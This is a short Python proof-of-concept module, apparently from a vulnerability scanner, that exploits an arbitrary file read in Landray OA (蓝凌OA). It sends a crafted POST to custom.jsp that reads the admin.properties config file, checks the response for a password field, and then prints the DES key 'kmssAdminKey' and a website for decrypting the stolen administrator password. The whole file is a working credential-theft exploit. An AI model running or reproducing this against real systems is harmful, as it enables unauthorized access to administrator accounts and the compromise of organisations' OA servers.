from modules import RequestsClass
def poc1(url): #蓝凌OA文件读取
	target = url+"/sys/ui/extend/varkind/custom.jsp"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Accept-Encoding': 'gzip',
	}
	data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
	r1 = RequestsClass.Requests(url,target,data,headers)
	res1 = r1.PostDatarequests()
	if res1 != False:
		if res1[0] == 200 and "password" in res1[1]:
			s=res1[1].strip()
			s1 = s.split('\r')[0]
			res = str('[+] '+url+"  文件读取漏洞存在！"+"\n"+"解密网站为：http://tool.chacuo.net/cryptdes"+"\n"+"DES解密密钥为：kmssAdminKey(注意解密的时候把/r去掉)"+"\n")
			return res
		else:
			res = str('[-] '+url+"  不存在文件读取漏洞！")
			return res
	else:
		res = str('[-] '+url+"  文件读取漏洞请求错误！")
		return res

def runall(url):
	r = poc1(url)
	return r